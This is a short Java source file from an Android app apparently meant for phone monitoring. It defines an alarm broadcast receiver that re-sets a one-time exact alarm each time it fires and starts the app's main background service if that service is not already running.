package com.monitor.phone.s0ft.phonemonitor;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class AlarmBroadcastReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Log.w(AppSettings.getTAG(),"Alarm broadcast received!");
        HelperMethods.createOneTimeExactAlarm(context);//re-set alarm

        Intent serviceIntent = new Intent(context, MainService.class);
        context.startService(serviceIntent);//the service may already be running, in which case nothing happens here; if it's not, service is started
    }
}
